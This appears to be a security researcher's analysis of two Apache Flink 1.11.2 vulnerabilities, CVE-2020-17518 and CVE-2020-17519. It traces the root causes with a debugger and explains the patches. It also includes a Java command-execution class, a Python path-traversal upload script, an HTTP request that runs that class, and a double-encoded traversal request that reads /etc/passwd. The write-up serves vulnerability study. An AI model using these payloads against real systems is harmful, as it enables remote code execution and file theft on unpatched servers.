# Apache Flink Vulnerability Analysis

# Preface

`Apache Flink` is a framework and distributed processing engine for state calculations of unbounded and bounded data streams.

#Environmental construction

Here, select the `Flink-1.11.2` version: [https://archive.apache.org/dist/flink/flink-1.11.2/](https://archive.apache.org/dist/flink/flink-1.11.2/).

After decompression, modify the `jobmanager.rpc.address` parameter in the configuration file `conf/flink-conf.yaml` to the local server `IP` address.

```bash
tar -zxvf flink-1.11.2-bin-scala_2.11.tgz
```

```java
jobmanager.rpc.address: 192.168.10.32
```

Modify the `bin/config.sh` file and specify the newly created path for `DEFAULT_ENV_PID_DIR`. This is because when `Flink` is started, the started process `ID` will be saved in a file. The default is `/tmp`. Since it is a temporary directory, it will be cleaned by the system. The stored process `ID` will not be found, which will cause the cluster to be closed.

```bash
DEFAULT_ENV_PID_DIR="/Users/alphag0/Desktop/flink-1.11.2/tmp" # Directory to store *.pid files to
```

Start the `Flink` service after adding remote debugging parameters

```java
# Remote debugging
env.java.opts.jobmanager: "-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5006"
# taskmanager debug port
env.java.opts.taskmanager: "-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005"
# Set the debug port of the cliFrontend client
env.java.opts.client: "-agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=5008"

rest.connection-timeout: 36000000
rest.idleness-timeout: 360000000
```

```bash
cd bin
./start-cluster.sh
```

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled.png)

Download the source code of the corresponding version: [https://github.com/apache/flink/releases/tag/release-1.11.2](https://github.com/apache/flink/releases/tag/release-1.11.2), create the Remote configuration in `IDEA`, specify `Host` and `Port`, and click the `Debug` button to run after the settings are completed.

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%201.png)

# Vulnerability

## CVE-2020-17518

### Vulnerability Description

[NVD - CVE-2020-17518](https://nvd.nist.gov/vuln/detail/CVE-2020-17518)

```
Apache Flink 1.5.1 introduced a REST handler that allows you to write an uploaded file to an arbitrary location on the local file system, through a maliciously modified HTTP HEADER. The files can be written to any location accessible by Flink 1.5.1. All users should upgrade to Flink 1.11.3 or 1.12.0 if their Flink instance(s) are exposed. The issue was fixed in commit a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4 from apache/flink:master.
```

### Vulnerability recurs

- Write malicious classes and compile them into `jar` package.

```java
import java.io.InputStream;
import java.util.Scanner;

public class Execute {
    public static void main(String[] args) throws Exception {
    	String cmd = args[0];
        try {
            if (cmd != null) {
                boolean isLinux = true;
                String osType = System.getProperty("os.name");
                if (osType != null && osType.toLowerCase().contains("win")) {
                    isLinux = false;
                }

                String[] command = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream inputStream = Runtime.getRuntime().exec(command).getInputStream();
                Scanner scanner = new Scanner(inputStream).useDelimiter("h3rmesk1t");
                String output = scanner.hasNext() ? "\n" + scanner.next() : "";
                throw new Exception((output));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

- Get the `Flink` run directory, and the path to `web.tmpdir` can be obtained through the interface `/jobmanager/config`.

```html
GET /jobmanager/config HTTP/1.1
Host: 192.168.10.32:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
```

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%202.png)

-Use the vulnerability to upload the `jar` package, construct the request packet, and upload the `jar` package to the directory`/var/folders/ch/d7lw4k6j2dn0sc9hnjnlzrg40000gp/T/flink-web-c9f4b5d7-3d33-42b1-8d8f-fa510a7c3d32/flink-web-upload`

```python
import requests
url = 'http://192.168.10.32:8081/jars/upload'

files = {
    'file': ('../../../../../../../../../../../../../../../../../../var/folders/ch/d7lw4k6j2dn0sc9hnjnlzrg40000gp/T/flink-web-c9f4b5d7-3d33-42b1-8d8f-fa510a7c3d32/flink-web-upload/Execute.jar', open(r'Execute.jar','rb'), 'form-data;name="jarfile
"')
}

r = requests.post(url, files=files)
print(r.text)
```

- Use the uploaded `jar` to execute the command.

```html
POST /jars/Execute.jar/run?entry-class=Execute&program-args=%22open%20-a%20Calculator%22 HTTP/1.1
Host: 192.168.10.32:8081
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
```

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%203.png)

### Vulnerability Analysis

The vulnerability repair-related `commit` is given in the vulnerability notification, [https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4#diff-7920624ff6651ac9897c79309c0a94073a4e7afb111e926c83414 92f3a730051](https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4#diff-7920624ff6651ac9897c79309c0a94073a4e7afb111e926c8341492f3a730051).

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%204.png)

Set a breakpoint at the relevant code of `FileUploadHandler.java`. After obtaining the request packet for `HTTP`, call the `org.apache.flink.shaded.netty4.io.netty.handler.codec.http.multipart.DiskFileUpload#getFilename` method to get the file name.

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%205.png)

Then call the `sun.nio.fs.AbstractPath#resolve` method to handle the upload file path, and call the `sun.nio.fs.UnixPath#resolve` method to resolve the upload path. Since the beginning of the upload path is not `/`, it will be further processed.

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%206.png)

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%207.png)

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%208.png)

In the above processing operation, call `System.arraycopy` to splice the upload path with the system path, and the variable `dest` stores the spliced ​​upload path and pass it to the `org.apache.flink.shaded.netty4.io.netty.handler.codec.http.multipart.fileUpload#renameTo` method.

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%209.png)

Call the `java.io.File#renameTo` method, and then call the `java.io.UnixFileSystem#rename` method to generate the cache file. At this time, the system will write the file according to the target path.

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2010.png)

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2011.png)

### Vulnerability patch

Call the `java.io.File#getName` method to process, truncate the incoming `filename`, and only the file name at the end. The passed `../` and directory name are ignored.

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2012.png)

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2013.png)

## CVE-2020-17519

### Vulnerability Description

[NVD - CVE-2020-17519](https://nvd.nist.gov/vuln/detail/CVE-2020-17519)

```
A change introduced in Apache Flink 1.11.0 (and released in 1.11.1 and 1.11.2 as well) allows attackers to read any file on the local filesystem of the JobManager through the REST interface of the JobManager process. Access is restricted to files accessible by the JobManager process. All users should upgrade to Flink 1.11.3 or 1.12.0 if their Flink instance(s) are exposed. The issue was fixed in commit b561010b0ee741543c3953306037f00d7a9f0801 from apache/flink:master.
```

### Vulnerability recurs

```html
GET /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd HTTP/1.1
Host: 192.168.10.32:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
```

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2014.png)

### Vulnerability Analysis

The vulnerability repair-related `commit` is given in the vulnerability notification, [https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801](https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801).

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f
299/Untitled%2015.png)

It is not difficult to see in the description of commit that the directory structure of the `..%252f` after secondary encoding can be used to replace the `../` directory structure of the `logs` folder. For example, the content of `README.txt` can be returned using `/jobmanager/logs/..%252f/README.txt`.

In the breakpoint in the `org.apache.flink.runtime.rest.handler.cluster.JobManagerCustomLogHandler#getFile` method, you can see that the `filename` stored in `pathParams` will be obtained, the `logDir` will be spliced ​​back to the path, and then the file content will be read as a response.

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2016.png)

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2017.png)

Note that the filename stored in `pathParams` is the decoded content. Check the stack information and trace the decoding process forward, follow up on the `org.apache.flink.runtime.rest.handler.router.RouterHandler#channelRead0` method.

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2018.png)

Call the `org.apache.flink.shaded.netty4.io.netty.handler.codec.http.QueryStringDecoder#decodeComponent` method for the first decoding, and assign the decoded value to `this.path`**. **

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2019.png)

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2020.png)

Then assign the `method`, `path`, and `queryParameters` to the `org.apache.flink.runtime.rest.handler.router.Router#route` method to initialize a `routeResult` object, follow up on the `org.apache.flink.runtime.rest.handler.router.Router#route` method, and call the `org.apache.flink.runtime.rest.handler.router.Router#decodePathTokens` method for secondary decoding.

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2021.png)

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2022.png)

![Untitled](Apache%20Flink%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%207d976a56676d4f50a5cb19ea74e8f299/Untitled%2023.png)

The vulnerability trigger point is also in the `org.apache.flink.runtime.rest.handler.router.Router#decodePathTokens` method. This method will first determine the `/` present in the path and truncate before the secondary decoding. Since the incoming `/` at this time is still in the encoding form and will not be truncated, the quadratic decoding is performed in the subsequent `for` loop and successfully return a normal path.

### Vulnerability patch

The `java.io.File#getName` method is still used to process it.